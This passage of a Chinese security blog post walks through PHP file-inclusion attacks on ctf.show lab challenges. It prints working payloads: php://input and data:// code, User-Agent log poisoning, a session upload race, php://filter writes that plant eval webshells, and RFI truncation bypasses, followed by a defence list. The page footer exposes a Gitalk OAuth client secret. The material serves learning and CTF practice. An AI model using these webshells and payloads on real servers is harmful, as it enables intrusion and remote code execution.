+<p> <img src="/assets/image-20240803171435-e0xkiog.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 写上对应的去掉PHP关键词php语句即可</p>
+<p> <code>?file=PHP://input POST data：&lt;?=system(&#39;tac fl0g.*&#39;);?&gt;</code>​中写上对应的去掉PHP关键词php语句，和文件匹配的后缀，更改为*号</p>
+<p> 成功拿到flag</p>
+<p> <img src="/assets/image-20240803171453-wmanb9h.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 第二种</p>
+<p> 使用<strong>日志记录文件包含，利用日志记录UA信息，UA带入代码</strong></p>
+<p> 1、使用文件读取：<code>file:///var/log/nginx/access.log</code>​ ，读取对应的日志文件内容（绝对路径），成功读取</p>
+<p> <img src="/assets/image-20240803171728-qhf4gw3.png" srcset="/img/loading.gif" lazyload alt="image"><br> 2、通过抓包，抓取到数据包，发送至repeater，并尝试修改UA头中的内容，修改成功</p>
+<p> <img src="/assets/image-20240803171753-ndx8cxv.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 于是尝试在UA头中写入恶意代码：<br> ​<code>User-Agent: 222222222&lt;?php system(&#39;ls&#39;)?&gt;</code>​并发送数据包，成功写入，并被解析fl0g.php index.php</p>
+<p> <img src="/assets/image-20240803171811-t0cj2rq.png" srcset="/img/loading.gif" lazyload alt="image"><br> ​<code>User-Agent: 333333333&lt;?php system(&#39;tac fl0g.php&#39;)?&gt;</code>​并发送数据包，成功写入</p>
+<p> <img src="/assets/image-20240803171821-zg9gy6i.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>WEB—82~86—SESSION包含</p>
+<p> <img src="/assets/image-20240803172037-z98gjoq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 确保以下配置项在 php.ini 文件中已启用</p>
+ <figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">session.upload_progress.enabled</span> = <span class="hljs-literal">On</span><br></code></pre></td></tr></table></figure>
+
+<p> 1、在本地创建文件上传代码如下，并将<strong>上传URL更改为对应的靶场网址</strong></p>
+ <figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;目标网址&quot;</span> <span class="hljs-attr">method</span>=<span class="hljs-string">&quot;POST&quot;</span> <span class="hljs-attr">enctype</span>=<span class="hljs-string">&quot;multipart/form-data&quot;</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&#x27;&lt;?php @eval($_POST[1])?&gt;&#x27;?&gt;&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;file&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;file&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p> 2、运行创建的网址，并随意上传文件，通过burp抓包，并加入<code>Cookie: PHPSESSID=wusuowei</code>​，自定义Session ID</p>
+<p> <img src="/assets/image-20240803172323-cdt2bz3.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 3、由于<code>session.upload_progress.cleanup</code>​是开启的，<strong>一旦读取了所有POST数据，就会清除进度信息</strong>于是我们需要条件竞争来读取文件，所谓条件竞争简单来说是<strong>在执行系统命令前先执行完自己的代码</strong>。</p>
+<ol>
+<li><p>将上传文件的数据包发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送上传文件数据包）</p>
+<p> <img src="/assets/image-20240803172517-5it91j6.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803172527-zs4g5sd.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>将访问上传文件的请求数据包抓取并发送至Intruder，选择Clear$后Playloads→Playload type:Null payloads , Payload Options →Continue indefinitely（无限发送访问请求数据包）</p>
+<p> <a target="_blank" rel="noopener" href="http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file%5C=/tmp/sess%5C_wusuowei">http://8dc5c2cc-397c-46d6-a28d-3b202ca37b6a.challenge.ctf.show/?file\=/tmp/sess\_wusuowei</a></p>
+<p> <img src="/assets/image-20240803172556-85pkdlq.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803172606-5cc9vzz.png" srcset="/img/loading.gif" lazyload alt="image"></p>
+</li>
+</ol>
+</li>
+<li><p>WEB—87—php:&#x2F;&#x2F;filter&#x2F;write&amp;加密编码</p>
+<p> <img src="/assets/image-20240803172953-z2ns9ux.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 正常来讲，浏览器会默认执行URL解码一次，但是提供代码中又加入了一次<code>urldecode($file)</code>​，即二次解码，所以要正常执行即要进行二次url编码</p>
+<p> 1、利用base64:</p>
+<ol>
+<li><p>url编码2次：<code>php://filter/write=convert.base64-decode/resource=123.php</code>​</p>
+</li>
+<li><p>Post data:写入<code>content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg</code>​</p>
+</li>
+</ol>
+<p> 这里需要补全数位aa</p>
+<p> <img src="/assets/image-20240803173425-ftz4xvt.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <img src="/assets/image-20240803173408-1gard0q.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<ol start="3">
+<li><p><strong>解码为&lt;?php @eval($_POST[a]);?&gt;（木马设置的密码为：a）</strong></p>
+</li>
+<li><p>通过访问，创建<strong>木马文件123.php</strong></p>
+</li>
+<li><p>并通过输入Post data：写入<code>a=system(&#39;ls&#39;);</code>​（通过木马密码进行替换操作）</p>
+<p> <img src="/assets/image-20240803173728-5rhjdgc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>并通过输入Post data：写入<code>a=system(&#39;tac fl0g.php&#39;);</code>​</p>
+<p> <img src="/assets/image-20240803173736-gtn7u76.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+<p> 2、利用凯撒加密</p>
+<p> url编码2次：<code>php://filter/write=string.rot13/resource=2.php</code>​</p>
+<p> Post data:写入<code>content=&lt;?cuc riny($_CBFG[1]);?&gt;</code>​</p>
+<p> ROT13解密：<code>&lt;?php eval($_POST[1]);?&gt;</code>​（木马设置的密码为：1）</p>
+<p> <img src="/assets/image-20240803173928-ow3n2g8.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 剩下的步骤一样</p>
+</li>
+<li><p>WEB—88—data-base64协议</p>
+<p> <img src="/assets/image-20240803174026-jva4z73.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> 过滤PHP，各种符号，php代码编码写出无符号（+和&#x3D;）base64值<br> Payload：<code>file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgKi5waHAnKTtlY2hvIDEyMzs/PmFk</code>​<br> 解密：<code>&lt;?php system(&#39;tac *.php&#39;);echo 123;?&gt;ad</code>​ <strong>（多出的echo 123 和 ad是为了去掉+和&#x3D;）</strong><br> 直接写<code>&lt;?php system(&#39;tac *.php&#39;);?&gt;</code>​，会出现被过滤的号&#x3D;&#x3D;</p>
+<p> <img src="/assets/image-20240803174241-lggisgm.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>WEB—117—php内置过滤器</p>
+<p> <img src="/assets/image-20240803174344-co1fb7z.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p> <strong>将众多编码形式做了过滤包括</strong> <strong>​<code>http</code>​</strong>​ <strong>,</strong>  <strong>​<code>https</code>​</strong>​ <strong>,</strong>  <strong>​<code>utf</code>​</strong>​ <strong>,</strong>  <strong>​<code>zlib</code>​</strong>​ <strong>,</strong>  <strong>​<code>data</code>​</strong>​ <strong>,</strong>  <strong>​<code>input</code>​</strong>​ <strong>,</strong>  <strong>​<code>rot13</code>​</strong>​ <strong>,</strong>  <strong>​<code>base64</code>​</strong>​ <strong>,</strong>  <strong>​<code>string</code>​</strong>​ <strong>,</strong>  <strong>​<code>log</code>​</strong>​ <strong>,</strong>  <strong>​<code>sess</code>​</strong>​ <strong>，不区分大小写（</strong>​<strong>​<code>i</code>​</strong>​ <strong>标志）</strong></p>
+<p> convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</p>
+<p> <img src="/assets/image-20240803174415-i6il0x4.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/* 将字符串 &#x27;&lt;?php eval($_POST[a]);?&gt; 从 UCS-2LE 编码转换为 UCS-2BE 编码*/</span><br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>, <span class="hljs-string">&quot;UCS-2BE&quot;</span>, <span class="hljs-string">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;经过一次反转:&quot;</span>.<span class="hljs-variable">$result</span>.<span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">//经过一次反转:?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br><br><span class="hljs-comment">// 将经过一次编码转换后的字符串再次从 UCS-2LE 编码转换为 UCS-2BE 编码</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;经过第二次反转:&quot;</span>.<span class="hljs-title function_ invoke__">iconv</span>(<span class="hljs-string">&quot;UCS-2LE&quot;</span>, <span class="hljs-string">&quot;UCS-2BE&quot;</span>, <span class="hljs-variable">$result</span>);<br><span class="hljs-comment">//经过第二次反转:&lt;?php eval($_POST[a]);?&gt;</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<ol>
+<li><p>Payload：<code>file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</code>​</p>
+</li>
+<li><p>Post data 中写入：<code>contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</code>​</p>
+<p> <img src="/assets/image-20240803174632-oxk99z9.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>解码为：<code>&lt;?php eval($_POST[a]);?&gt;</code>​（木马设置的密码为：a）</p>
+</li>
+<li><p>通过访问，创建木马文件a.php，<a target="_blank" rel="noopener" href="http://e57a2227-b187-459c-8172-ed70850fee7c.challenge.ctf.show/123.php">http://e57a2227-b187-459c-8172-ed70850fee7c.challenge.ctf.show/123.php</a></p>
+</li>
+<li><p>并通过输入Post data：写入<code>a=system(&#39;ls&#39;);</code>​（通过木马密码进行替换操作）</p>
+<p> <img src="/assets/image-20240803174656-or2zo5d.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+<li><p>并通过输入Post data：写入<code>a=system(&#39;tac flag.php&#39;);</code>​</p>
+<p> <img src="/assets/image-20240803174705-lr47iyj.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+</li>
+</ol>
+</li>
+</ol>
+<p>‍</p>
+<h4 id="5、临时文件包含"><a href="#5、临时文件包含" class="headerlink" title="5、临时文件包含"></a>5、临时文件包含</h4><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_62989306/article/details/125114940">php7卡临时文件包含</a></p>
+<p>‍</p>
+<p>‍</p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含-RFI"></a>远程文件包含-RFI</h2><h3 id="无限制远程文件包含"><a href="#无限制远程文件包含" class="headerlink" title="无限制远程文件包含"></a>无限制远程文件包含</h3><p>找到对应的小皮PHP设置中的远程包含并开启或者在对应&#x3D;&#x3D;网址服务的PHP版本下找到php.ini文件，并将allow_url_include&#x3D;Off改为On即可&#x3D;&#x3D;</p>
+<p><img src="/assets/image-20240802201949-lukl0t7.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>通过远程服务，创建file.txt内容为<?php phpinfo();?> ，并使用远程包含，将对应文件地址替换为远程创建的文件的ip访问地址即可</p>
+<p><img src="/assets/image-20240803102413-nqlm98q.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p><img src="/assets/image-20240803102530-1nvtmqc.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>‍</p>
+<h3 id="有限制文件包含"><a href="#有限制文件包含" class="headerlink" title="有限制文件包含"></a>有限制文件包含</h3><p><img src="/assets/image-20240803191842-o6s9dqo.png" srcset="/img/loading.gif" lazyload alt="image">​</p>
+<p>1.这里的代码比上面无限制的代码多了<code>.html</code>​</p>
+<p>2.当我们此时再对远程文件进行文件包含的时候，就失败了。</p>
+<h4 id="绕过方法"><a href="#绕过方法" class="headerlink" title="绕过方法"></a>绕过方法</h4><p><strong>第一种：末尾加</strong>​<code>%20</code>​</p>
+<p><strong>第二种：末尾加</strong>​<code>%23</code>​</p>
+<p><strong>第三种：末尾加</strong>​<code>?</code>​</p>
+<p><strong>第四种：</strong>​<code>%00</code>​<strong>截断（php版本&lt;5.3.4）</strong></p>
+<p>‍</p>
+<p>‍</p>
+<h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>敏感信息泄露：</p>
+<p>攻击者可以读取服务器上任意文件或目录的内容，从而可能泄露敏感信息，例如数据库连接字符串、密码、客户数据或源代码。</p>
+<p>任意代码执行：</p>
+<p>如果攻击者可以提交恶意文件路径并且 Web 服务器将该文件解析为脚本，则攻击者可能会能够执行任意代码，从而可以在服务器上安装恶意软件、创建后门或发起进一步的攻击。  </p>
+<p>‍</p>
+<h1 id="如何防御"><a href="#如何防御" class="headerlink" title="如何防御"></a>如何防御</h1><p>1、使用str_replace等方法过滤掉危险字符</p>
+<p>2、配置open_basedir，防止目录遍历（open_basedir 将php所能打开的文件限制在指定的目录树中）</p>
+<p>3、php版本升级，防止%00截断</p>
+<p>4、对上传的文件进行重命名，防止被读取</p>
+<p>5、对于动态包含的文件可以设置一个白名单，不读取非白名单的文件。</p>
+<p>6、做好管理员权限划分，做好文件的权限管理，allow_url_include和allow_url_fopen最小权限化</p>
+<p>‍</p>
+<h1 id="环境复现"><a href="#环境复现" class="headerlink" title="环境复现"></a>环境复现</h1><p>‍</p>
+<p>‍</p>
+<p>‍</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/WEB%E6%94%BB%E9%98%B2/" class="category-chain-item">WEB攻防</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/WEB%E6%94%BB%E9%98%B2/" class="print-no-link">#WEB攻防</a>
+      
+        <a href="/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" class="print-no-link">#文件包含漏洞</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>文件包含漏洞💼</div>
+      <div>http://example.com/2024/03/26/文件包含漏洞💼/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>0z-sIHN</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2024年3月26日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2024/03/26/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%F0%9F%93%A1/" title="文件上传漏洞">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">文件上传漏洞</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/03/26/RCE%E6%BC%8F%E6%B4%9E%F0%9F%90%9B/" title="RCE漏洞🐛">
+                        <span class="hidden-mobile">RCE漏洞🐛</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"Ov23liT0OJSQBYUz81HU","clientSecret":"02c5c39d96d158a8a34967805e40cb90a7b2f1cf","repo":"0z-sihn.github.io","owner":"0z-sIHN","admin":["0z-sIHN"],"language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":true,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: '85b0bf6a02a66f8bca5f9b7b76c12f04'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+<div>
+  <span id="timeDate">正在载入天数...</span>
+  <span id="times">载入时分秒...</span>
+  <script>
+  var now = new Date();
+  function createtime(){
+      var grt= new Date("11/10/2024 22:36:00");
+      now.setTime(now.getTime()+250);
+      days = (now - grt ) / 1000 / 60 / 60 / 24;
+      dnum = Math.floor(days);
+      hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum);
+      hnum = Math.floor(hours);
+      if(String(hnum).length ==1 ){
+          hnum = "0" + hnum;
+      }
+      minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+      mnum = Math.floor(minutes);
+      if(String(mnum).length ==1 ){
+                mnum = "0" + mnum;
+      }
+      seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+      snum = Math.round(seconds);
+      if(String(snum).length ==1 ){
+                snum = "0" + snum;
+      }
+      document.getElementById("timeDate").innerHTML = "🚀已持续航行&nbsp"+dnum+"&nbsp天";  
+      document.getElementById("times").innerHTML = hnum + "&nbsp时&nbsp" + mnum + "&nbsp分&nbsp" + snum + "&nbsp秒";
+  }
+  setInterval("createtime()",250);
+  </script>
+</div>
+
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="busuanzi_container_site_pv" style="display: none">
+        总访问量 
+        <span id="busuanzi_value_site_pv"></span>
+         次
+      </span>
+    
+    
+      <span id="busuanzi_container_site_uv" style="display: none">
+        总访客数 
+        <span id="busuanzi_value_site_uv"></span>
+         人
+      </span>
+    
+    
+
+  
+
+</div>
+
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="/diy_js/typing-effect.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
